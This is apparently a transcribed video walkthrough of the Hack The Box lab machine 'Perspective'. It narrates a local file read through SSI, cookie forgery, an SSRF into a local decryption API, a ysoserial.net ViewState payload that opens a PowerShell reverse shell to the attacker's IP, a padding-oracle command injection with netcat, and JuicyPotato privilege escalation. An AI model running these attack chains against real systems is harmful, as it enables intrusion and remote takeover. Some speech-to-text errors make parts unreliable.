 what's going on YouTube this is ipsec Merino in perspective from hack the box which is an insane Windows machine but it's pretty much just a net web application that you attack it starts off with finding a lfi that you can read the web.config file and get the machine key and generally you can just go straight to YSU serial here and make a malicious view state to get some code execution but it's protected by the view State user key that's encrypted so you can't do that however it leaks some other information that you can forge a cookie to be the administrative user that leaks a ssrf that gets you to a password encryption service that can decrypt The View State user keys so you use that to get shell on the box and then you find a version of this app that's running in staging but it's got the auto generate isolate apps for the validation key so you can't use the same deserialization instead there's a command injection vulnerability but you have to abuse a padding Oracle attack to create a blob that can exploit this so with that being said let's just jump in as always you start with the end map so Dash SC for default scripts SV enumerate versions OA output all formats put in the nmap directory and call it perspective and then the IP address of 10 10 11.151 this can take some time to run so I've already ran it looking at the results we see just two ports open the first one being SSH on Port 22. in its Banner is a bit weird it just says open SSH for Windows so this is a Windows server that has SSH open we also have HTTP on Port 80 and this is an IIs web server the scripts aren't really telling us all that much so let's just copy the IP address and go to it on a web browser so pasting this in we get a redirection to perspective.hdb so let's add this to a host file so sudo VI Etsy host and then we can add 10 10 11 151 and perspective.hdb definitely remove the http so refresh this page and it may take a second maybe DNS is cached we go back here redirects and thing perspective.htb definitely exist I'm guessing right now my DNS is cached and it just had to expire which here we go so we have a northern sprocket machine parts LLC and we can click here to get started there's also like a register link and a login link and looking at this it's not really leaking oh god um didn't mean to do that let's see login I close the register so looking at this it's not exposing exactly what type of web server this is so I'm going to try like index.html we get error found looking at this it's not really leaking anything we can try like aspx nothing ASP we get a 404 aspx was a server error I'm going to try index.php we get 404 so I'm going to guess that this is going to be some type of aspx application just because we get this different 404 error um actually I was thinking this was like a 500 error but no this is 404 so seeing this change I'm thinking this is going to be some type of virtual host routing right because if we don't put the correct extension so like index.php it goes to this error message which I think is a default like IIs one if we put aspx in this we get a server error it's still a404 but a completely different format of this error message so I think this is like doing some type of routing and maybe aspx sends it to a different web pool so like virtual host routing and because it does that it's just going to a completely different site so let's take a look at both these errors so burp Suite is finally up we can run this in send this and then I'm going to repeater tab it send it again with PHP we see Server Microsoft IIs xpowed by ask.net so we know this is an asp website looking at this now we get a aspnet version so that piece is new and that only happens when we give it aspx so I'm guessing certain extensions will get sent through this virtual host um interesting but doesn't really buy us all that much so let's take a look at the web server functionality we can register or log in so register we can do an email so root at dipsec.rocks password needs B6 characters Max of five lowercase uppercase and symbol so I'm gonna do please sub exclamation point for the password so put that in first car I'm going to do a favorite movie Let's do B and childhood friend I will do c let's see if there's any restrictions there uh invalid email what maybe we need perspective.hdb and then password we can still paste that that's on my clipboard double check that's where I thought it was it is register and let's try logging in so root at perspective.hdb paste it remember login and that works so the first thing I'm going to check because we had some reset questions is I forgot password so let's do root at perspective.hdb put a b c in initiate the request and we can change password right away and this is probably going to be a vulnerability at least I would classify it as one because um you should like get an email like security questions aren't secure so uh if I was doing a web app pen test I would definitely be writing up like insecure password reset we can change this to see how this works the main thing I was looking for to see if like username was here so if username was here we may be able to just change it and Trigger some type of idor vulnerability if we look at token decoder let's do smart decode decode as base64 looks random so that's nothing important um we do have the extension ashx so it is leaking exactly what it uses that's the first time we saw that let's forward my password reset resetting password successfully reset so let's try doing another user let's do forgot password I'm going to guess admin at perspective.htb initiate reset and administrative viewers cannot reset passwords so I'm going to try like admin with a bunch of junk not a valid user so we also have a way to enumerate valid users which would be another Finding initiate this reset yes we can't so if I do the root again let's look at these questions so intercept this and let's see we have some standard.net stuff we have email so we may be able to change it here to admin forward and we get a 500 error that just says unspecified so let's try this again and I'm going all the way back to try it because um just in case there's any like um service side request forgery things like that I wanted to initiate a new request because maybe failing the request kills my token so let's intercept this and I insert an empty form I can and I'm gonna do admin at perspective.htb we forward this along here's the token it's getting it again and it wants us to put a password so I'm going to do please sub exclamation point and paste this new password in and it says resetting password from admin at perspective.hdb success so if I log in we can log in with admin at perspective.htb and gain access to this admin panel now this was an unintended thing so I'm going to take a step back I just wanted to show a password reset vulnerability so let's go back and log in with our account so root prospective.hdb and I think that may skip a few steps but it gets all confusing so we're on this new products page and if we click new product we can say product name uh please description Let's do let's actually test xss everywhere sub let's put it all in bold slash B suggested price 12 product category belts and we need to upload something so let's do hdb perspective endless upload our nmap file that should be fine click on submit and only JPEG file types are accepted so I'm going to locate Dash r4x.jpg dollar to terminate and I'm just going to grab a random jpeg I have on my box let's do this greenbone Banner dot jpeg and we can upload it so browse go up one directory here is upload it malicious input detected so I'm guessing that's going to be cross-site scripting so let's remove that add this submit and it works so we can view this image and we get exactly where the image is so the next piece I want to do is test out um this again so please sub 12 and we're going to edit the extension to see what it's actually flagging on right so if I do submit I am in verb Suite and we can change this to be um let's do aspx or what is it ashx and we got the content type because that was automatic so for this along invalid file extension so I'm going to try let's dot txt so intercept another request oh where is it Ford product submission requires image okay the image wasn't there that's why I couldn't see it in the post request um I guess when the web form returns you it doesn't save that so we have this we can try another extension I'm just gonna do txt invalid file extension so at this point I'm gonna fuzz to see if there's anything because when we [Music] um don't have that image JPEG it blocks us that says it requires jpeg things and when we put some extensions sometimes it works sometimes it doesn't right or we just know it doesn't work but we get a different error message so there's two different checks going on um if I put a random content type I think it's going to fail even though this is jpeg yes update status so I want to see if there's any valid extensions other than jpeg we can use so let's submit and I'm going to copy this to a file I'm going to call this upload product dot request right or EQ and then the syntax I'm going to use and it's going to be very similar to SQL map with the dash R we can do Dash request specify the raw HTTP request and then the protocol so let's edit a request and then I'm going to look for the file name so if I just do jpeg and this is the file name right here so we see green burn Banner and I'm getting rid of that and I'm just going to put Buzz and then I'm going to delete the actual image because I don't think this matters and every time we upload this image it would just be um taking time like if we shrink this request so it's not megabytes big it will Buzz faster which is funny because the Tool's name is fuzz faster you fool but um let's see content type we need to probably put some data here so this will be ipsec was here that'll be the text okay and then we need a valid extension and an invalid extension so I'm going to do extension Dot text I guess and we'll do dot jpeg this will be the valid request dot PHP dot ashx dot txt okay and we can do buff Dash request upload Dash request Proto because this is HTTP it defaults to https and then um Dash W for word list and we want to give it extension.txt and we can see 8706 was the success we know jpeg is acceptable 8713 is a failure I would guess we can run this again just to make sure um it's the same as I go God it's not but jpeg moved so what we want to do is match the size so Ms and then 8706 okay so that's the valid extension jpeg so the last piece we want to do is find a better word list so I'm going to do find opt seclist and grep for EXT um let's do extension and I'm going to look at this extension's most common file and this looks good the only thing is it's not pre-pending with a period so I'm going to edit my upload request where fuzz is and add that period before fuzz so we can go back to this request and paste in this extension list and run it and we can see the valid extensions so we can upload php4 php3 tar um jhtml shdm s HTML so we got a few things we can upload the one that sticks out first is of course PHP um I doubt it's going to work because well it's PHP um but doesn't hurt to try so let's see the easiest way to upload this let's just create a PHP shell so test.php PHP Echo please sub we don't need to do anything fancy and execute code when we're just testing it and we wanted this to be php4 so now let's go back to the site browse test php4 um I guess we're going to drop this and then go back okay that looks good product name please two and let us intercept this request because we need to change where is it where's my file right here this needs to be image slash jpeg so forward and we have the image here so if I open this image in a new tab we get the weird IIs error if this was Dot aspx uh we still get that error um which is odd ashx so something's happening in this image directory or maybe that one aspx thing only works in the root because I was expecting an error message that looks like this but okay um we can't do PHP going back to this shtml is interesting especially on Windows because this can be used to um do like an lfi so I'm going to Google shtml hat tricks and we see server-side inclusion Edge side inclusion and how it works let's see include Edge side see I'm guessing this right here so we can include files potentially so what I'm going to do copy this line and then let us do v test Dot shtml paste this in and is generally has a file called web.config um Let's see we can just try this and then try going up One Directory and reading it as well so we're going to read web.config Let's see we don't even need to intercept anything oh no we will because we need to change um the mime type so put this please three intercept on submit and I don't want virtual I want to include file I thought right where is this okay that's what I meant this one I wonder if they both work um text HML this needs to be image JPEG Ford and we have this uploaded so if I open this image in new tab uh we get a blank page control U to view the source and we can see the web config so let's try going up One Directory I wonder if I go HTTP history go to the last post for this send it to repeater I wonder if I can just do dot dot slash like this and change this to please four send s object moved so let's go back here refresh the page and there is please four so up open this look at the source and we have a much bigger um web config file so looking at this one there's nothing really interesting in this web config but this one I'm guessing does have stuff so what I'm gonna do is just curl it oh god um curl like that nope I guess we can copy and then paste B web.config there we go I wonder if I put this way now we have syntax highlighting so going over this the first thing that jumps out is we have this connection string and it's talking about Ms SQL so I'm just glancing over to see if there's any credentials it doesn't look like there is so it's probably using the authentication of whatever user is running the web server so it's just using the default like Windows single sign-on type things so the database is going to be perspective I don't see anything else interesting in the connection string so we move on we can see what version of.net it is we probably had this information already based upon the HTTP header uh going down we have aspx auth which I don't know exactly what that is so we should take a look at this so maybe um V nodes.txt Dot aspx auth and let's just move on we got the machine key so I'm going to um copy this so can we easily copy I think I can come on take this line I hope this end just copy to like Vim go down sweet that is copied and this is important because generally speaking if we get the um machine key which I think I just copied right I can't find it now yeah machine key generally if we get this um we can get code execution on.net through the um cookies like this let's see where is it uh aspx auth the view State cookie we can generally do some type of deserialization and once we get the crypto keys but there is going to be something here that stops US doing that from right away eventually we will so you'll see that attack um going down and this is always important whenever you think you have something always read the whole like thing because you may just miss it don't just go oh I got this and now let's go to this rabbit hole right or this thing always read the entire thing this is talking about like a password attempt window I'm guessing this is going to be in minutes we have five attempts and this I guess is just using some built-in like login feature of SQL or something uh loading questions we have prospective 500 these are runtimes that it's running so maybe like you tie these into the gadgets you use for your deserialization telling you everything that's working and the deserialization essentially works it needs to find a place that has an execute code and um sometimes those assemblies do but we'll get to that later um let's see static file Handler it's only going to handle HTML files statically and then we also have shtml it's got the module service site include module enabled so this is why that um shtml thing worked to include it because it's in the Handler for this web config and this file isn't created by hand um it's created in the IIs server manager which is a GUI that just creates these for you so um right here we have the environment production domain perspective.hdb and then we got the view State user key and this is going to be why we can't just um take the machine key and get code execution on the box because we also have to decrypt this user key so paste this here and then the other piece of information that is important is we got a third service or another service I said third because SSH web but now we got a another service on localhost 8000 and since nmap didn't show this I'm just going to guess this is only listening on localhost and it is secure password service so right off the bat thinking about this I'm guessing somehow we can do a ssrf to access localhost 8000 and do something with this password service and that will allow us to decrypt The View State user key which then allows us to use this machine key on our view State and get code execution on the box but I don't know where that server-side request forgery is all we have right now is a file upload and um I guess we could like arbitrarily guess paths on the server and hopefully find the source code to this password service URL but that doesn't seem like a likely thing especially if it's running as a different user and we just don't have permission to read that file the one thing I don't know that I saw and there's that dot aspx auth so that's where I probably begin my research just because there's a piece I don't know what it is so let's turn burp Suite off go over to Google and the very first thing I would just do is google.aspx off and see what comes up and we have what is this cookie we have a decoding thing and it's talking a lot about how it is and this is used to determine if the user is authenticated and I believe it's a library within.net I've never created um like Windows Web apps like this so I don't know I'm just basing everything off my understanding from doing like ctfs and Things So eventually I went to like forms Crypt because I knew this was a like web form thing aspx auth um GitHub decrypt and let's see we do have this um Library this afternet crypto tools and we have a decrypt and a encrypt function and if we look at the decrypt it is going to be a net app and we just need to supply the encrypted forms ticket so um that will be let's see view state probably in the cookies here it is so this is probably going to be the encrypted value and it's in HEX so um we have to compile this.net thing so we can then run it I did a lot of searching I couldn't find a python one so I'm going to switch over to a Windows machine and this is just so we can compile so I'm going to open up visual studio and there are instructions on the GitHub the key thing is choose a console app here and scroll down to where it's a console app um and Dot NET Framework for uh see this right here I hope this is the key thing uh let's I'm just gonna name this forms crept and then we can create we may want to change the.net version to match the source but in this case I don't think it matters so I'm just going to create this and then once it's created we can copy and paste this code over top of our program.cs and when we save this I thought it was going to give an error message let's see can we actually compile I wonder if mine automatically did it once because I've done it before uh no so there we go once it finally processed we have it not understanding what system web security is so if we do project I think it's project then add reference and then scroll down to the system web assembly we can add it and now that doesn't go underlined squiggly so it wants us to supply the ticket so let's just build this again and we see the build is successful so let's go into this directory CMD CD here dot slash formscript and we need to supply the ticket so let's go over here copy our cookie go back paste in the cookie and let's see we did not add the details we need let's see formscript program uh oh we have to add another file I should have went to and follow the instructions because I mean we have to add the secret on how it's encrypted right so if we look at this it says create a new C Dot and then replace app config with the app config in this repo and this is going to be where the machine can stuff is so copy this go back here go in this app config paste and now we need to change to your decryption key I feel like that did not paste well because I don't think that's how it looked I think my IDE changed something because this looks much better how it has machine key and we look here it I don't even know what it attempted to do but let's get the correct values for this and we put them in the notes I'm just going to cut it so we can copy and paste easier so copy this go back to our Windows box let's go to notepad where we see it and let's see I wonder if we can just copy like leave this whole line I mean that looks fine let's fix those spaces there fix these spaces is it 9191 I'm thinking that's correct can't imagine it it's screwing that up but I'm just going to grep to verify so let's go here grep on notes and it's not so I think we screwed something up oh no because we got these tabs or whatever so my copy and paste when I paste this in I don't think went well but let's see if that causes a problem so paste this what the paste no I do not know why this is not pasting well see get rid of that I think that works rebuild succeeded let's run it again and sweet it decrypted it so everything is working um uh sometimes you just fight with the stupidest things so we know what a ticket looks like so we can go and grab the um other one let's see where is that that's app config so we can go to forms encrypt so we can encrypt our own ticket so let's copy this go back here go back to program CS and we'll paste it and this will be the encrypted and it is kind of weird how this is set up um it's using the encrypted ticket to populate some values I'm just going to um remove that right because we don't need encrypted ticket the replace username we want let's see what is that used oh right here um let me even remove this we don't need unencrypted ticket so the name we just want to put the username here and it's going to be what was mine root perspective.hdb I'm going to do admin at perspective.hdb and then we can get that off and then the next field is going to be the date time so this is when it was created and this is how long it's going to last for so let's do 9001 minutes to give us plenty of time I don't even know how long it's going to be probably over a day and then we have is persistent and we just want to set that one to true so let's just do true like that maybe lowercase for Boolean and then test let's put test and then it ends with a slash okay so let's see forms encrypt encrypt ticket that should be good let's build it and then do a dir we can just do formscript.exe and it built us a ticket if we um decrypt it it'll look pretty much identical to this and if it fails we'll decrypt it and see what happens but let's go back to our home page we can refresh here and it should be us still logged in I don't know why it's not working there we go do we log out has it already been yeah so we're not logged in right now so let's go here let's do storage changer aspx auth and we're going to put the new ticket in here enter to refresh and we are admin at perspective.hdb and if you've been following this whole video we're this user once before because of this insecure password reset but we'll ignore that so now going over to the admin panel we can click on this new product admin panel we want to load user data we can try loading data from ourselves and we get nothing we try our user root at perspective we have this if we click generate PDF let's see exactly what happens I'm going to close some of these tabs just to clean up looks like it's taking a while unspecified error try it again if we get okay there we go for some reason sometimes the first time you generate you just get an error message but now we have something being converted to a PDF so at this point I'm thinking it's going to be some type of like server-side request forgery from PDFs but when we tried before we had trouble um what is it doing X cross-site scripting but we put xss in every field before so I'm going to open a new browser window so we can have two users logged in at once because the new product button is gone so let's do root at perspective password one oh no uh we did please sub exclamation point for the password new products I'm going to delete the ones we don't need and then we can just do a new product browse add a image and I'm going to put xss here and we'll see so I'm going to try Fields one at a time and it looks like it worked um it does html and the encoding here but if we refresh this page on admin we have HTML ND encoding as well clicking on generate PDF let's open this up and we have a um bold text so we know we can put some HTML in the HTML in here so I wonder if we can just do like generic cross-site scripting so let's go back to this browser window and let's see I'm gonna do script source is equal to http 10 10 14 8. or 8000 slash .js so let's see if we can make whatever's generating the PDF reach back out to her box so we do this and we have malicious input detected so we can't use script um I wonder if we can use image even do this uh we have it requires an image so every time we'll have to do this malicious input detected so we can't use image let's try iframe so add this again iframe Source submit malicious input detected on iframe so it looks like we can't use any of those um maybe we can do like a meta to refresh so this is on hack tricks I'm sure if you Google like HTML scriptlist injection you'd find it but all we're doing is creating some HTML code that's going to force a refresh immediately and go to a different website so let's do this that's going to refresh I think on zero seconds and then we'll navigate it over to our box so 10 10 14 8 8 000 pound dot HTML I don't know if I need that in quotes or not oh we did single quotes let's do double quotes around the whole thing and then end it with this and did I put for 8 000 I did so submit this file name already exist so that's better so test two Let's uh add this image there we go I'm going to delete test and we just have test two so I need to stand up a web server so make www cdww and we call it parent.html and we're just gonna put a note python3-am ACP server so let's click generate PDF and see if it reaches back to us it does we have 10 10 11 151 and if we do open with uh we don't have any text oddly enough but it did hit us so that's a win I wonder curl 10 10 14 8 pound.html it looks fine I was really expecting to see um like it say that right so I wonder if we need HTML tags HTML slash HTML like that Maybe at once things wrapped in HTML let's go back here generate PDF loading open with there we go I don't know if we needed HTML but that definitely looks better so the next thing I would probably do is want to inspect the headers so NC lvmp 8000 this is gonna be the easiest way to do it and the reason why I want to do this is maybe it's going to leak the um like text to PDF converter and maybe that will have a vulnerability in it right so we look at prone HTML user agent it's using a headless Chrome so maybe we could do a chrome vulnerability referral we have perspective.hdb and not much else right so the other piece of information that we have is um let's see what was it dot dot slash notes we do have something listening on localhost 8000. so we could change the redirect and have it go to localhost 8000. oh wait did I delete the wrong one admin products let's do root okay no I did not that just looked weird um but that's good so we could just change this to refresh localhost 8000 but I really hate having to do that every time so what I'm going to do here is just put another redirect and we'll see what's here right so I wonder if I can just use another meta HTTP equiv this is going to be really funny if it works uh there's Bunches of other ways to do this right we could just include the source or something and do an iframe or a bunch of other ways to do it but we're gonna refresh it now to be http localhost 8000. so now when we hit this so if I went to my browser localhost oh oh it's kind of like infinite loot me isn't it because I'm standing this on 8 000. I probably .html we load it huh I don't know why it's not actually just viewing the file oh because we go to pone.html and that's directing us to just the directory listing but on the web server itself there is a service listing on uh port 8000. so let's click that generate button again after we close this PDF so that's new product Northern sprocket generate PDF and it should hit us and now after it hit this poem.html it got redirected to localhost 8000 and we can see a secure password service and we can look at the Json for all the data in here at swaggerv1 swagger.json so what I'm going to do is let's edit the parent.html to go to localhost 8000 then Swagger V1 swagger.json and now when we generate the PDF again we should get just Json data on how this works right yep so we have open API we can I wonder if we can copy this to a file and view it let's see V Swagger dot Json set mode to paste paste this in cat JQ dot sweet we could view it this way and we see how each function works there was two functions we have a encrypt which accepts a get request and we also have a decrypt which accepts a post request now the intended way of this box isn't to do the post because I think the author didn't expect us to be able to send a post request however we can and that's the way I'm going to show and then when I get some more time I'm going to show the encrypt method the reason why I'm going the unintended route is because I want this to be in its own video because we're attacking a stream Cipher and I think that would probably be 15 to 20 minutes of just a good Standalone video so let's just go into how we can attack this decrypt um just like our um what is it like how we'd redirect it a user here in our HTML we can create a web form and have them submit a string to the service and if we have them Auto submit on that web form then we will be able to get the decrypt function working so I know that was a pretty bad explanation but the reason why this is going to work is because there's no cross-site request forgery um checking happening right so all we have to do is go back into pound.html and then we can create a form so we're just going to do form ID is equal to please subscribe and then we're going to tell the form it's a post and then we can hard code the action to go HTTP 127001 or 8000 and this is actually somewhat important um Windows is really quirky with localhost and sometimes it triggers to like IPv6 and then the web server isn't bound on IPv6 and it doesn't work so I always like doing 127001 even though I think in The Meta I use localhost and it worked fine um just on Windows I like being in the habit of using 127001 so now we want to go back to the Swagger documentation so bycat swagger.json Jake Q like this we need to do a post request to slash decrypt so let's go decrypt and then the value I keep thinking it's in a different thing but it's um and different pane we want ciphertext Raw so we do that and then equals to what we want to decrypt so I'm going to look at our notes again and we want this view State user key so I'm just going to copy and paste that there and this quote and I'm going to URL encode this so equals is 3D I'm not sure if we have to but whenever you um deal with like special characters and forms it's just best to URL encode it um then we can say script and we can say verb form is equal to document get element by ID please subscribe so this is going to be JavaScript to get this form and then we'll just do form dot submit so as soon as it hits this all right as soon as it hits the page it submits this form for us to that right and this is the whole reason cross-sec request forgery happens because it would be a lot harder for us to do this if we force this to access the page get the token then Auto build the form with that token because what the cross site request 4G would do would be put a different value here and then this would be some Dynamic value so every time we submit the form we'd have to figure out what that csrf token is not impossible but some browser hardening such as cores and things like that may make it extremely extremely difficult but General API documentation doesn't have that so let's just try this again right so going back to a browser um we are listening on 8000 right that's still there yes we are so I'm just clearing the screen so we can see it generate PDF we hit pound it's saying do we want to save let's just open it and we get salty salty Vier state so this is going to be the view State parameter so if I go back into my notes we can say this value is salty salty View I think there's a three on the end of that right there it is and because we have this now parameter we can go back to yso serial.net and create a malicious view state that will allow us code execution on the machine so I'm going to copy and I'm going to go back to Windows paste this in just so we have it and we want to grab yso serial.net so Google then why so serial.net GitHub we will download it release where is it here it is oh we should disable Defender let's see Verizon threat manage settings turn off try downloading it again oh come on allow download okay see downloads extract it's empty one of the founder deleted that one we have it in here so we can extract this and I'm just going to put on my desktop ISO serial.net and let's go command prompt CD users user desktop release so we have it now working so now comes the hard part and that is building all of the parameters so I think I'm just going to do it in notepad let's do format view format word wrap and let's see so we do YSU serial dot EXE and then we want to give it view state so if we do ycl Dash h uh let's see Dash p is going to be the plugin so plugins are here and we picked the view State One and we need definitely the machine key um the gadget we're going to use is going to be type confuse delegate which is just a normal Gadget I use with the view State and the command we're going to do is just ping 10 10 14 8 we're going to Ping us so now we need to give it all the parameters so the first one is going to be the machine key and I think that's going to be this the validation key and I'm just cleaning up the spaces that were in it and I still don't like how it just looks um I'm gonna put this on separate lines because this entire thing is going to be the machine key and every parameter here is valuable to us um so let's just put these on lines there we go uh decryption and I'm going to move validation Above This so now we can do Dash Dash validation algorithm and that's going to be sha1 dash dash validation key and that's going to be this then dash dash decryption algorithm that's going to be a yes because we see that here and then dash dash decryption key that's going to be this okay we'll also need um the generator and the generator if we go back to a request let's see can I find it real quick uh repeater where's the view state few State generator so I'm going to copy this and we'll paste that in so Dash Dash generator is equal to that and then The View State user key is equal to this and I think this is all we need so paste this in and we get a nice view State blob so I'm going to copy this let me go back here I'm going to paste our malicious blob in and we can do sudo TCP dump Dash I ton zero icmp I'm going to also add a dash n so we don't do DNS queries and if we send this I was hoping I type sudo here that's funny we don't get anything so we did that we have view State generator um Ctrl shift U to on your own code it send I was expecting to see um files so view State type confuse delegate ping 10 10 14 8 is that my IP it is yep I am 10 10 14 8. we are listening TCP dump icmp salty state it did start with a slash weird I think we screwed something up I just don't know what it is I'm gonna try copying it again and let's just try it on the home page so let's intercept a new request so proxy intercept on okay aspx auth admin new product let's try root is this gonna have okay we got the view State here we got a different generator so let us paste and I'll just generate actually let's just generate a new payload with this generator we could probably just swap out and put our generator in but let's see where is that at the end paste copy and paste forward and we got pings so it worked um I'm guessing like the request we did wasn't valid anymore and it kind of like timed out or something like that um not exactly sure what went on there but we can see we did get the machine pinged us four times right one two three four yeah and it's definitely being us 151 it's sending the request and This Is Us replying back so the next piece we want to do is of course get a reverse shell so I'm going to go to user or let's just copy CP user share the Shang then what is it shells and we'll do what is it invoke Powershell TCP one line dot PS1 I'm just going to call it rev.ps1 and let's edit it to do the shell we want and if this doesn't work it's probably going to be antivirus and we'll have to do some light evasion so 10 10 14 8. 9001 and that looks good right client yeah so let's cap this um I convert to UTF 16 little Indian because that's how Powershell likes it and base64-w0 so now we have this that we can definitely want to copy that J copy nclbmp 9001 go over here um we can actually go back to this and a command we can do powershell-enc for encoded command and paste this Powershell blob so let's go back to this and we're going to get a um new like view State thing right so let's intercept on actually I'm going to refresh this page make sure everything is correct admin and here we go so view State generator DD where is that paste this in copy paste and copy this entire blob and paste it here we are listening for the request and we have a connection so now we have a reverse shell if we do who am I slash priv we can see we have the SC impersonate privilege I'm going to use potato at the end of this box because um it works now when this box was released potato was patched but a new version of potato came out since this happened which is the story of Windows like um so we'll show that as the unintended at the end so if I do who am I we can see we have perspective web user if I do CD slash users we can go into web user and let's see there is a DOT SSH directory so if we go here and we have an idrsa key so we can copy this key and get a proper shell and like a save point on this box so let's copy this V webuser.idrsa of do the correct paste chmod 600 sh Dash I this web user at 10 10 11 151 yes to accept it and we have SSH on this box awesome so one of the first things I always like looking at is a list of open ports so I know there's a way to do listening only um I'm just going to use find string because I'm lazy and we can see every port that's listening well we know 22 we know 80 135 140 445 there's our SMB we have winrm as well Port 8000 this is going to be the um secure password service that API thing we saw we don't know what 8009 is though um by try to access perspective.htb over report 8009 let's see exactly what happens here um we're getting nothing we could also netcat so nczv 8009 get rid of http and we see it's closed if we try Port 80 it's open but we can't get to 8009 so what I'm going to do is the very first characters I'm going to type is squiggly C and that gets me to this SSH prompt and I'm going to do a local port forward 8009 127001 8009 and remember whenever dealing with Windows I always use 127001 and not localhost just because I've been burned once by that and wasted a lot of time so um I always just use the IP address so now we can go 127001 8009 and see what happens I'm looking here to see if any error messages pop up nothing does and we have the same website um let's go back to perspective.hdb and the one thing that is different is this is on Port 80 and the domain is perceptive.htb and this is on Port 8009 and whoops it says staging so one common thing about this one like you're in a stage in a development environment is the web server isn't in production mode and when it's not in production mode uh generally you get more verbose error messages so like index dot whatever gives us this 404 if we try it on perspective we just have this one so there's a much more detailed error Trace so whenever we change something on this or create an error we get a reverse error um I'm not going to show it but the same like lfi vulnerability exists if we create an account on this so but it doesn't really bias anything because we can do the lfi or we can just play around in SSH right so if I do like part images prod this is going to be the production one I'm going to type web.config because I think this is where it says production um environment production here and if we look at the part images staging we have more data um environment oh no that's the same one somewhere we're in staging there's also something else that I wanted to point out in this file let's see where is it let's go to the top I'm going to type machine so looking at this we can see the machine key Auto decryption and the decryption key is auto generate isolate apps which is like a new IIs thing so decryption key automatically gets generated when the service starts so reading this doesn't give us a decryption key which means we can no longer do any deserialization attack against this web service so um if you're ever doing like a secure code review on an IIs app and you see the decryption key hard-coded I'd probably mark it as a finding and say you want to use Auto generate and isolate app so reading this file doesn't give you rce it's a good way to protect IIs web servers so if we played around with these functions so let's see um let's do login we forget password and I'm going to try admin at perspective.htb um administrative users can't let's try root initiate reset not a valid user so let's create another user root at perspective please sub exclamation point uh security questions a b c sure let's do a forgot password root a b c and we have this token and this is going to be the piece I change so I wonder if I delete one character from this what do we have um nothing I wonder if we have to actually change it please sub exclamation point change password we get error um I'm gonna send this over to burp sweet so burp Suite intercept on change password repeater send it to repeater as I said no control R control shift R there we go so what error do we get the length of data to decrypt is invalid and this is going to only reason we're getting this error is because we're in um production uh staging mode so we had this Dash that was the valid one I'm just going to change it to a different character so the length is correct and we have padding is invalid and whenever you see encryption and padding you know it's probably going to be a padding Oracle attack but before you get into that I just want to test this out on production so you can see I want to say this was vulnerable in production but because it's not giving you verbose error messages there's no way to really exploit it so let's do login forgot password root then we can do a b c okay let's now intercept this request please sub exclamation point uh we can drop this change password send this and I'm going to rename these this is going to be staging reset and this will be prod reset so let's get rid of a character the B no longer there send we get object moved capital B send and it's just sending us to this 500 page and not giving us any details whereas again staging doesn't do that and is telling us the verbose error on why it failed and we have if you go to ipsec.rocks I'm sure I'm going to go into padding Oracle more in depth in previous videos but honestly um whenever I talked about it probably on overflow or lazy um I knew more about it then because I researched it just before creating the video um now I don't really know exactly everything there is to it I know you brute force blocks one at a time and based upon the padding message you can leak the key but um outside of that I don't really know because the script just makes it so easy for you so let's go back over to a box and we're going to check do we have padbuster we do have pad Buster on this but before I get into that I just remembered I forgot to show one last piece of this um if we looked at the source code for this let's see it's in handlers then change password Dot ashx that's type it we can see let's see how does this work invalid characters so what it's using is um it's going to go inet Pub bin and then fraud or staging here and then execute password reset.exe plus the decrypted string plus the password and it only does that if the token is acceptable but what we can do here is we have command injection it's just running command and then password reset.exe so what it's doing CMD C let's go up C colon inet Pub bin now let's just do staging password reset dot EXE a decrypted string I'm going to guess this is username and then password and what we can do is append and and run malicious code here right so that's going to be the attack but in order to um edit this password we have to know exactly how the token is encrypted so that's what we're going to do with padbuster so let's look at the help and the first three parameters it's gonna be URL the encrypted sample and the block size the block size is generally going to be 8 or a 16. um I try on both but in this case I know it's going to be 16. I'm sure we could probably like pull this password uh exe thing and decrypt it and figure it out but um I'm not going to do that because generally you just guess with these type of things so 127.001 8009 that's going to be where this service lives then we paste this which is the URL and then the blob we want so if we go prod reset I want to say this was a dash I really hope it's a dash I'm pretty sure that's what the original thing was so URL then the encrypted sample and then the block size which is 16 and then we need to give it the post data so post and we can just copy this there's no single quotes in here that would break it okay then after that we need the encoding and we want to tell it to use web safe base64. and then the next thing we need is the error string and this is going to be what it says when the padding is incorrect and we can just say this okay and then the last piece what I want to make the plain text and I think we can just do a argument then um we'll upload netcat to this box and do it this way hit enter and I believe it's just going to go to town and this takes a while to work so um I guess while this goes we can upload netcat let's see where's my SSH session was that three four five five so locate nc64.exe we can just copy it from something you can just Google like a Windows netcat 64. or go to ipsec.rocks I'm sure I download it somewhere here um we can just SCP this right SCP Dash I web user idrsa web user at 10 10 11 151 I don't like putting Windows pads there so I'm just going to copy it and then we'll move it backslash users web user we have netcat 64. we do and Defender did not delete it so we are good on that front so we can move to C colon program data move there we go and then let's just make sure this works CD backslash program data dot slash NC was it ncnc64 let's move this to nc.exe 8 9001 okay so a netcat works we are just waiting on pad Buster to finish so I'm gonna pause the video and we'll just let this go okay so it took probably 30 minutes but we have a key so this is going to be the moment of truth if uh we did this correctly we should be able to just go to a proxy tab and replace the token with this token 40 and get a shell which it doesn't look like we can um just in case something timed out I'm going oh maybe that was a timeout here that's a weird thing change password let's see put the token there please sub please sub go to burp Suite intercept on we got our malicious token here hornet nothing happens but we get a shell so I think we just had timed out and we are now perspective backslash administrator so if we do CD slash users and then administrator and desktop we can get root.txt and the reason this worked is I'm guessing Port 8009 just runs as the administrative user and Port um 80 runs as web user so staging zoning as admin and the regular ones running as web user um and we couldn't do the deserialization again because they included the um web they did the web config in a secure way if you went back in the video um I forget exactly what words I used uh you just go web apps oh let's do it where we have tab auto complete fraud staging type web config so if we could have done another view State attack um it's machine key um if we if this was hard-coded we could just got deserialization went to administrator right away but because we don't have this decryption key we couldn't abuse the same vulnerability we did on production so um I guess the last part of this and did I kill that shell no it's still running here um who am I slash priv we do have SC impersonate so let us do the juicy potato route real quick hopefully that doesn't take too long let's turn off I'm just going to Google juicy [Music] potato and G and we go to the GitHub I think it has a release for downloads so we can W get this let's see V jp.zip W get this actually there we go move this to www then unzip juicypotato.zip I think a web server still running nope it was not so let's go back to program data and then we're going to do two things the first thing is we should make a um test.bat filer we'll call it shell dot bat and all this is going to do is the Powershell Dash encoded command and we want to grab oh we can do netcat so let's just put down our web server and download it B shelled up that there we go curl 10 10 14 8 8 000 shell dot bat Dash o shell.bat and then curl ten ten fourteen eight eight thousand juicy potato and g dot exe Dash o jp.exe if we do juicypotato.exe um we can't just straight off the bat run this because there is a firewall in place that broke previous versions of Juicy potato one of the things was um a firewall rule and we can get around that by just doing dash s and this is going to find suitable com ports not filtered by Windows Defender so I'm just going to let this command run and it's going to tell us what ports we can use for this juicy potato so we didn't get any output with this dash s and the reason why I believe is it's writing to standard error and the nashang 